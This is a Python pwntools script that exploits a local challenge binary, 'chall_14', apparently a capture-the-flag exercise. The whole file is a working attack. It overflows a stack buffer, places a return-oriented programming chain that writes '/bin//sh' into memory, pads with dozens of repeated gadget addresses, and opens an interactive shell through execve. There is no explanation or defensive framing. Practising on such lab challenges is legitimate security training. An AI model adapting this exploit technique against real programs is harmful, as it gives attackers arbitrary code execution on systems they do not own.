coding: utf-8
from pwn import*
def chall14():
     x = process("./chall_14")
     p = b''
     p += p64(0x000000000040f3fe) 
     p += p64(0x00000000004c00e0) 
     p += p64(0x00000000004494a7) 
     p += b'/bin//sh'
     p += p64(0x000000000047b9c5) 
     p += p64(0x000000000040f3fe) 
     p += p64(0x00000000004c00e8) 
     p += p64(0x0000000000443b00) 
     p += p64(0x000000000047b9c5) 
     p += p64(0x00000000004018ca) 
     p += p64(0x00000000004c00e0) 
     p += p64(0x000000000040f3fe) 
     p += p64(0x00000000004c00e8) 
     p += p64(0x00000000004017cf) 
     p += p64(0x00000000004c00e8) 
     p += p64(0x0000000000443b00) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0)
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0)                                                                             
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0)                                                                                
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0)
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0)
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0)                                                                            
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0)                                                                            
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0)
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0)
     p += p64(0x00000000004709f0)
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0)
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0)                                                                            
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0)
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0)
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0)
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004709f0) 
     p += p64(0x00000000004012d3) 
     payload=b'a'*0x100+b'c'*8+p 
     x.sendline(payload)
     x.interactive()
    
   
